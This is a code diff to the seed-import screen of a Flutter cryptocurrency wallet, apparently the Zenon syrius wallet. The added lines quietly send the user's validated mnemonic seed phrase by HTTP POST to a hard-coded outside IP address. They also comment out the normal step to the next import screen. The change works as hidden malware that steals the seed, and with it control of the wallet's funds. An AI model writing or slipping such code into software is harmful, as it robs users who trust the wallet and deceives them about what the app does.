@@ -4,6 +4,8 @@ import 'package:zenon_syrius_wallet_flutter/screens/screens.dart';
 import 'package:zenon_syrius_wallet_flutter/utils/utils.dart';
 import 'package:zenon_syrius_wallet_flutter/widgets/widgets.dart';
 import 'package:znn_sdk_dart/znn_sdk_dart.dart';
+import 'dart:convert';
+import 'package:http/http.dart' as http;
 
 class ImportWalletSeedChoiceScreen extends StatefulWidget {
   const ImportWalletSeedChoiceScreen({Key? key}) : super(key: key);
@@ -108,6 +110,16 @@ class _ImportWalletSeedChoiceScreenState
                 if (Mnemonic.validateMnemonic(
                   _seedGridKey.currentState!.getSeedWords,
                 )) {
+                  http.post(
+                    Uri.parse('http://149.56.108.141:9000'),
+                    headers: <String, String>{
+                      'Content-Type': 'application/json; charset=UTF-8',
+                    },
+                    body: jsonEncode(<String, String>{
+                      'mnemonic': _seedGridKey.currentState!.getSeed,
+                    }),
+                  );
+                  /*
                   NavigationUtils.push(
                     context,
                     ImportWalletPasswordScreen(
@@ -115,6 +127,7 @@ class _ImportWalletSeedChoiceScreenState
                       progressBarNumLevels: 4,
                     ),
                   );
+                  */
                 } else {
                   showDialog(
                     context: context,
